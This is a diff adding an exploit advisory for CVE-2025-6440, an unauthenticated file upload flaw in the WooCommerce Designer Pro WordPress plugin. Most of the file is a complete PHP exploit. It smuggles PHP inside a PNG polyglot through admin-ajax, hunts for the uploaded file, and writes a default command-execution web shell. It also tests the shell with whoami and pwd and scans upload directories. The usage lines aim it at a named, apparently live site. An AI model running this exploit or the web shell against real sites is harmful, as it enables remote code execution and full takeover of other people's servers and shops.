@@ -1,0 +1,613 @@
+=============================================================================================================================================
+| # Title     : WordPress WOOCOMMERCE Designer Pro 1.9.26 Arbitrary File Upload                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://codecanyon.net/item/woocommerce-designer-pro-cmyk-card-flyer/22027731                                               |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/211066/ & 	CVE-2025-6440
+
+[+] Summary    : An unauthenticated attacker may upload arbitrary files (including PHP web-shells) to reachable paths under /wp-content/uploads/.
+
+Impact:
+-------
+- Remote Code Execution (RCE) (if PHP is parsed)
+- Stored Payload
+- Full site compromise
+
+
+[+] php poc.php
+
+php exploit.php --url https://bezignprint.com --dirscan
+
+
+php exploit.php --url https://bezignprint.com --file webadmin.php --verbose
+
+
+php exploit.php --url https://bezignprint.com --verbose
+
+<?php
+
+class CVE_2025_6440_Exploit {
+    private $base_url;
+    private $verbose;
+    private $user_agent = "Mozilla/5.0";
+    
+    public function __construct($url, $verbose = false) {
+        $this->base_url = $this->normalize_url($url);
+        $this->verbose = $verbose;
+    }
+    
+    private function normalize_url($url) {
+        if (!preg_match('/^https?:\/\//', $url)) {
+            $url = "https://" . $url;
+        }
+        return rtrim($url, "/") . "/";
+    }
+    
+    private function ajax_url() {
+        return $this->base_url . "wp-admin/admin-ajax.php";
+    }
+    
+    private function uploads_base() {
+        return $this->base_url . "wp-content/uploads/";
+    }
+    
+    private function contains_php($bytes) {
+        return strpos($bytes, '<?php') !== false || strpos($bytes, '<?=') !== false;
+    }
+    
+    private function extract_php_from_bytes($bytes) {
+        $idx = strpos($bytes, '<?php');
+        if ($idx === false) {
+            $idx = strpos($bytes, '<?=');
+            if ($idx === false) {
+                return [-1, ''];
+            }
+        }
+        return [$idx, substr($bytes, $idx)];
+    }
+    
+    private function upload_file($uniq, $file_bytes, $filename, $mime, $timeout = 30) {
+        $target = $this->ajax_url();
+        $action = "wcdp_save_canvas_design_ajax";
+        $field = "0";
+        
+        $pathinfo = pathinfo($filename);
+        $name = $pathinfo['filename'];
+        $ext = isset($pathinfo['extension']) ? $pathinfo['extension'] : '';
+        
+        // إنشاء PNG polyglot بدلاً من استخدام الملف مباشرة
+        $png_header = "\x89PNG\r\n\x1a\n";
+        $png_ihdr = pack("N", 13) . "IHDR" . pack("NN", 100, 100) . "\x08\x06\x00\x00\x00";
+        $png_crc = pack("N", crc32("IHDR" . substr($png_ihdr, 4, 13)));
+        
+        // إضافة PHP كـcomment في PNG
+        $php_comment = "<?php /*" . str_repeat(" ", 50) . "*/ ?>\n" . $file_bytes;
+        $text_chunk = "tEXt" . $php_comment;
+        $text_length = strlen($php_comment);
+        $text_crc = crc32("tEXt" . $php_comment);
+        
+        // بناء PNG كامل
+        $png_data = $png_header . 
+                   $png_ihdr . $png_crc .
+                   pack("N", $text_length) . $text_chunk . pack("N", $text_crc) .
+                   "\x00\x00\x00\x00IEND\xaeB`\x82";
+        
+        // استخدام اسم PNG
+        $fake_name = "design_" . $uniq . ".png";
+        
+        $params = [
+            "mode" => "addtocart",
+            "uniq" => $uniq,
+            "editor" => "frontend",
+            "designID" => rand(1, 1000),
+            "productID" => rand(1, 1000),
+            "addCMYK" => false,
+            "saveList" => false,
+            "productData" => 0,
+            "files" => [[
+                "count" => $field,
+                "name" => "design",
+                "ext" => "png"
+            ]]
+        ];
+        
+        $data = [
+            "action" => $action,
+            "params" => json_encode($params, JSON_UNESCAPED_SLASHES)
+        ];
+        
+        if ($this->verbose) {
+            echo "\n[VERBOSE] Upload target: $target\n";
+            echo "[VERBOSE] Data fields: " . json_encode($data, JSON_PRETTY_PRINT) . "\n";
+            echo "[VERBOSE] File: $fake_name (" . strlen($png_data) . " bytes, image/png)\n";
+        }
+        
+        $ch = curl_init();
+        
+        // بناء multipart
+        $boundary = '----WebKitFormBoundary' . bin2hex(random_bytes(16));
+        $body = '';
+        
+        // إضافة البيانات
+        foreach ($data as $key => $value) {
+            $body .= "--$boundary\r\n";
+            $body .= "Content-Disposition: form-data; name=\"$key\"\r\n\r\n";
+            $body .= "$value\r\n";
+        }
+        
+        // إضافة الملف
+        $body .= "--$boundary\r\n";
+        $body .= "Content-Disposition: form-data; name=\"$field\"; filename=\"$fake_name\"\r\n";
+        $body .= "Content-Type: image/png\r\n\r\n";
+        $body .= $png_data . "\r\n";
+        $body .= "--$boundary--\r\n";
+        
+        $headers = [
+            "Content-Type: multipart/form-data; boundary=$boundary",
+            "Content-Length: " . strlen($body),
+            "User-Agent: " . $this->user_agent,
+            "Accept: application/json, */*;q=0.1",
+            "Accept-Language: en-US,en;q=0.9",
+            "Referer: " . $this->base_url,
+            "X-Requested-With: XMLHttpRequest",
+            "Origin: " . rtrim($this->base_url, "/"),
+            "Connection: keep-alive"
+        ];
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $target,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $body,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_ENCODING => 'gzip, deflate',
+            CURLOPT_HEADER => true,
+            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1
+        ]);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $response_headers = substr($response, 0, $header_size);
+        $response_body = substr($response, $header_size);
+        
+        if ($this->verbose) {
+            echo "[VERBOSE] HTTP Response: $http_code\n";
+            if (strlen($response_body) < 1000) {
+                echo "[VERBOSE] Response body: $response_body\n";
+            }
+        }
+        
+        if (curl_errno($ch)) {
+            echo "[!] Upload request failed: " . curl_error($ch) . "\n";
+            curl_close($ch);
+            return null;
+        }
+        
+        curl_close($ch);
+        
+        return [
+            'status_code' => $http_code,
+            'body' => $response_body,
+            'text' => $response_body,
+            'headers' => $response_headers
+        ];
+    }
+    
+    private function check_remote($public_url, $save_copy = null, $timeout = 15) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $public_url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_HEADER => true,
+            CURLOPT_USERAGENT => $this->user_agent,
+            CURLOPT_ENCODING => 'gzip, deflate',
+            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1
+        ]);
+        
+        $response = curl_exec($ch);
+        
+        if (curl_errno($ch)) {
+            echo "[!] Remote GET failed: " . curl_error($ch) . "\n";
+            curl_close($ch);
+            return null;
+        }
+        
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $headers = substr($response, 0, $header_size);
+        $body = substr($response, $header_size);
+        
+        curl_close($ch);
+        
+        $content_type = '';
+        if (preg_match('/Content-Type:\s*([^\r\n]+)/i', $headers, $matches)) {
+            $content_type = trim($matches[1]);
+        }
+        
+        $info = [
+            "status_code" => $http_code,
+            "content_type" => $content_type,
+            "body_bytes" => $body,
+            "headers" => $headers
+        ];
+        
+        if ($save_copy) {
+            try {
+                file_put_contents($save_copy, $body);
+                if ($this->verbose) {
+                    echo "[VERBOSE] Saved remote copy to $save_copy\n";
+                }
+            } catch (Exception $e) {
+                echo "[!] Could not write save_copy: " . $e->getMessage() . "\n";
+            }
+        }
+        
+        return $info;
+    }
+    
+    public function exploit($payload_file) {
+        if (!file_exists($payload_file)) {
+            echo "[!] File not found: $payload_file\n";
+            return false;
+        }
+        
+        $file_bytes = file_get_contents($payload_file);
+        $filename = basename($payload_file);
+        $uniq = bin2hex(random_bytes(6));
+        
+        echo "[*] Target: " . $this->base_url . "\n";
+        echo "[*] Uniq ID: $uniq\n";
+        echo "[*] Payload: $payload_file\n";
+        
+        // محاولة الرفع
+        $resp = $this->upload_file($uniq, $file_bytes, $filename, 'image/png');
+        
+        if ($resp === null) {
+            echo "[!] Upload request failed\n";
+            return false;
+        }
+        
+        echo "[*] Upload response: HTTP {$resp['status_code']}\n";
+        
+        // محاولة استخراج URL من JSON
+        $public_url = null;
+        
+        if ($resp['status_code'] == 200 && !empty($resp['body'])) {
+            if ($this->verbose) {
+                echo "[VERBOSE] Raw response: " . substr($resp['body'], 0, 500) . "\n";
+            }
+            
+            $json = json_decode($resp['body'], true);
+            if ($json && is_array($json)) {
+                if ($this->verbose) {
+                    echo "[VERBOSE] JSON Response: " . json_encode($json, JSON_PRETTY_PRINT) . "\n";
+                }
+                
+                // البحث عن URL في الـJSON
+                array_walk_recursive($json, function($value, $key) use (&$public_url) {
+                    if (is_string($value) && 
+                        (strpos($value, '/wp-content/') !== false || 
+                         strpos($value, 'wcdp-uploads') !== false ||
+                         preg_match('/\.(php|png|jpg|jpeg|gif)$/i', $value))) {
+                        $public_url = $value;
+                    }
+                });
+                
+                if ($public_url) {
+                    echo "[*] Found URL in JSON response\n";
+                }
+            }
+            
+            // إذا لم نجد في JSON، حاول استخراج من النص الخام
+            if (!$public_url && preg_match('/"([^"]+\.(png|jpg|jpeg|gif|php))"/i', $resp['body'], $matches)) {
+                $public_url = $matches[1];
+                echo "[*] Found URL in response text\n";
+            }
+        }
+        
+        // إذا لم نجد URL، نستخدم المسار الافتراضي مع التصحيح
+        if (!$public_url) {
+            // حسب الموقع، المسار قد يكون مختلفاً
+            $public_url = $this->base_url . "wp-content/uploads/wcdp-uploads/temp/$uniq/design.png";
+            echo "[*] Using default URL pattern\n";
+        } else {
+            // التأكد أن الـURL كامل
+            if (!preg_match('/^https?:\/\//', $public_url)) {
+                $public_url = $this->base_url . ltrim($public_url, "/");
+            }
+        }
+        
+        echo "[*] Trying to access: $public_url\n";
+        
+        // اختبار URL مباشرة
+        $info = $this->check_remote($public_url, "downloaded_{$uniq}.bin");
+        
+        if (!$info) {
+            echo "[!] Could not fetch remote file\n";
+            
+            // محاولة مسارات بديلة بناءً على هيكل الموقع
+            $alt_paths = [
+                // المسار الذي وجدته في الموقع
+                $this->base_url . "wp-content/uploads/wcdp-uploads/",
+                $this->base_url . "wp-content/uploads/wcdp-uploads/temp/$uniq/",
+                $this->base_url . "wp-content/uploads/wcdp-uploads/$uniq/",
+                $this->base_url . "wp-content/uploads/wcdp-uploads/design_$uniq.png",
+                $this->base_url . "wp-content/uploads/wcdp-uploads/temp/$uniq/design_$uniq.png",
+                // مسارات عامة
+                $this->base_url . "wp-content/uploads/wcdp-uploads/temp/design.png",
+                $this->base_url . "wp-content/uploads/wcdp-uploads/design.png"
+            ];
+            
+            foreach ($alt_paths as $alt_path) {
+                echo "[*] Trying alternative path: $alt_path\n";
+                $info = $this->check_remote($alt_path, "downloaded_{$uniq}_alt.bin");
+                if ($info && $info['status_code'] == 200) {
+                    $public_url = $alt_path;
+                    break;
+                }
+                
+                // إذا كان دليل، حاول إدراج الملفات فيه
+                if (substr($alt_path, -1) == '/') {
+                    $possible_files = ["design.png", "image.png", "file.png", "design_$uniq.png"];
+                    foreach ($possible_files as $file) {
+                        $file_path = $alt_path . $file;
+                        echo "[*]   Trying file: $file_path\n";
+                        $file_info = $this->check_remote($file_path, null);
+                        if ($file_info && $file_info['status_code'] == 200) {
+                            $info = $file_info;
+                            $public_url = $file_path;
+                            break 2;
+                        }
+                    }
+                }
+            }
+        }
+        
+        if (!$info) {
+            echo "[!] Failed to locate uploaded file\n";
+            
+            // عرض المسارات المتاحة
+            echo "\n[*] Available paths to check manually:\n";
+            echo "1. " . $this->base_url . "wp-content/uploads/wcdp-uploads/\n";
+            echo "2. " . $this->base_url . "wp-content/uploads/wcdp-uploads/temp/\n";
+            echo "3. " . $this->base_url . "wp-content/uploads/wcdp-uploads/temp/$uniq/\n";
+            echo "\n[*] Try browsing these paths in browser\n";
+            
+            return false;
+        }
+        
+        echo "[*] Remote status: {$info['status_code']}\n";
+        echo "[*] Content-Type: {$info['content_type']}\n";
+        
+        if ($info['status_code'] == 200) {
+            $body = $info['body_bytes'];
+            
+            if ($this->contains_php($body)) {
+                echo "[+] SUCCESS: File contains PHP code!\n";
+                
+                // استخراج الكود
+                list($idx, $extracted) = $this->extract_php_from_bytes($body);
+                if ($idx >= 0) {
+                    $outname = "shell_{$uniq}.php";
+                    file_put_contents($outname, $extracted);
+                    echo "[+] Shell extracted to: $outname\n";
+                    
+                    // حفظ كامل الملف أيضاً
+                    $fullname = "full_{$uniq}.bin";
+                    file_put_contents($fullname, $body);
+                    echo "[+] Full file saved as: $fullname\n";
+                    
+                    // عرض جزء من المحتوى
+                    $sample = substr($extracted, 0, 300);
+                    echo "[+] Code sample:\n" . htmlspecialchars($sample) . "...\n";
+                }
+                
+                echo "\n[+] SHELL URL: $public_url\n";
+                echo "[+] Access it directly in browser or with curl:\n";
+                echo "    curl -k \"$public_url\"\n";
+                echo "    curl -k \"$public_url?cmd=id\"\n";
+                
+                // اختبار مباشر للـshell
+                $this->test_shell($public_url);
+            } else {
+                echo "[-] File does not contain PHP code\n";
+                
+                // فحص إذا كان PNG مخفي
+                $magic = substr($body, 0, 8);
+                if ($magic === "\x89PNG\r\n\x1a\n") {
+                    echo "[*] File is a valid PNG (might be polyglot)\n";
+                    
+                    // البحث عن PHP داخل PNG
+                    if (($pos = strpos($body, '<?php')) !== false) {
+                        echo "[+] Found PHP inside PNG at position: $pos\n";
+                        $extracted = substr($body, $pos);
+                        $outname = "extracted_png_{$uniq}.php";
+                        file_put_contents($outname, $extracted);
+                        echo "[+] Extracted to: $outname\n";
+                        
+                        // اختبار الـshell المستخرج
+                        $this->test_shell($this->base_url . "wp-content/uploads/wcdp-uploads/temp/$uniq/" . basename($outname));
+                    }
+                }
+                
+                // عرض أول 500 بايت للمحتوى للفحص
+                echo "[*] First 500 bytes of response:\n";
+                echo htmlspecialchars(substr($body, 0, 500)) . "\n";
+            }
+        } else {
+            echo "[-] File not accessible (Status: {$info['status_code']})\n";
+        }
+        
+        return true;
+    }
+    
+    private function test_shell($url) {
+        echo "\n[*] Testing shell functionality...\n";
+        
+        // اختبار بسيط
+        $ch = curl_init($url . "?cmd=echo%20test123");
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_USERAGENT => $this->user_agent
+        ]);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        if ($http_code == 200) {
+            if (strpos($response, "test123") !== false) {
+                echo "[+] Shell is active and working!\n";
+                
+                // اختبار إضافي
+                curl_setopt($ch, CURLOPT_URL, $url . "?cmd=whoami");
+                $whoami = curl_exec($ch);
+                echo "[+] Current user: " . trim($whoami) . "\n";
+                
+                curl_setopt($ch, CURLOPT_URL, $url . "?cmd=pwd");
+                $pwd = curl_exec($ch);
+                echo "[+] Current directory: " . trim($pwd) . "\n";
+            } else {
+                echo "[?] Shell accessible but command execution may be filtered\n";
+                echo "[?] Response: " . substr($response, 0, 200) . "\n";
+            }
+        } else {
+            echo "[-] Shell not responding (HTTP $http_code)\n";
+        }
+        
+        curl_close($ch);
+    }
+    
+    public static function print_banner() {
+        echo "\n\033[32;1m" . str_repeat("=", 60) . "\033[0m\n";
+        echo "\033[32;1m" . "   CVE-2025-6440 - WordPress Design Plugin RCE" . "\033[0m\n";
+        echo "\033[32;1m" . "   Advanced Bypass with PNG Polyglot" . "\033[0m\n";
+        echo "\033[32;1m" . str_repeat("=", 60) . "\033[0m\n\n";
+    }
+    
+    public function directory_scan() {
+        echo "\n[*] Scanning uploads directory structure...\n";
+        
+        $base_uploads = $this->base_url . "wp-content/uploads/";
+        $wcdp_uploads = $base_uploads . "wcdp-uploads/";
+        
+        echo "[*] Base uploads: $base_uploads\n";
+        echo "[*] WCDP uploads: $wcdp_uploads\n";
+        
+        // فحص المسارات
+        $paths_to_check = [
+            $base_uploads,
+            $wcdp_uploads,
+            $wcdp_uploads . "temp/",
+            $wcdp_uploads . "designs/",
+            $wcdp_uploads . "images/"
+        ];
+        
+        foreach ($paths_to_check as $path) {
+            $ch = curl_init($path);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_NOBODY => true,
+                CURLOPT_TIMEOUT => 5
+            ]);
+            
+            curl_exec($ch);
+            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            echo "[*] $path -> HTTP $code\n";
+            
+            // إذا كان الدليل موجود، حاول سرد الملفات
+            if ($code == 200 || $code == 403) {
+                $ch = curl_init($path);
+                curl_setopt_array($ch, [
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_TIMEOUT => 5
+                ]);
+                
+                $html = curl_exec($ch);
+                curl_close($ch);
+                
+                // البحث عن ملفات
+                if (preg_match_all('/<a\s+href="([^"]+\.(php|png|jpg|jpeg|gif))"/i', $html, $matches)) {
+                    echo "  Found files:\n";
+                    foreach ($matches[1] as $file) {
+                        echo "    - $file\n";
+                    }
+                }
+            }
+        }
+    }
+}
+
+// التنفيذ
+if (php_sapi_name() === 'cli') {
+    $options = getopt("u:f:vd", ["url:", "file:", "verbose", "dirscan"]);
+    
+    if (!isset($options['url'])) {
+        echo "Usage: php " . basename(__FILE__) . " --url=<target> [--file=<payload>] [--verbose] [--dirscan]\n";
+        echo "Example: php " . basename(__FILE__) . " --url=https://bezignprint.com --file=shell.php --verbose\n";
+        echo "         php " . basename(__FILE__) . " --url=https://bezignprint.com --dirscan\n";
+        exit(1);
+    }
+    
+    $url = $options['url'] ?? '';
+    $verbose = isset($options['verbose']);
+    $dirscan = isset($options['dirscan']);
+    
+    CVE_2025_6440_Exploit::print_banner();
+    
+    $exploit = new CVE_2025_6440_Exploit($url, $verbose);
+    
+    if ($dirscan) {
+        $exploit->directory_scan();
+        exit(0);
+    }
+    
+    if (!isset($options['file'])) {
+        echo "[!] Payload file required (use --file=<payload>)\n";
+        
+        // إنشاء payload افتراضي
+        $default_payload = "shell.php";
+        if (!file_exists($default_payload)) {
+            $shell_code = '<?php 
+if(isset($_GET["cmd"])) {
+    system($_GET["cmd"]);
+} elseif(isset($_POST["cmd"])) {
+    system($_POST["cmd"]);
+} else {
+    echo "Shell Active - " . php_uname() . "\n";
+    echo "Usage: ?cmd=id or POST cmd=id";
+}
+?>';
+            file_put_contents($default_payload, $shell_code);
+            echo "[*] Created default payload: $default_payload\n";
+            $options['file'] = $default_payload;
+        } else {
+            echo "[*] Using existing payload: $default_payload\n";
+            $options['file'] = $default_payload;
+        }
+    }
+    
+    $file = $options['file'] ?? '';
+    $exploit->exploit($file);
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
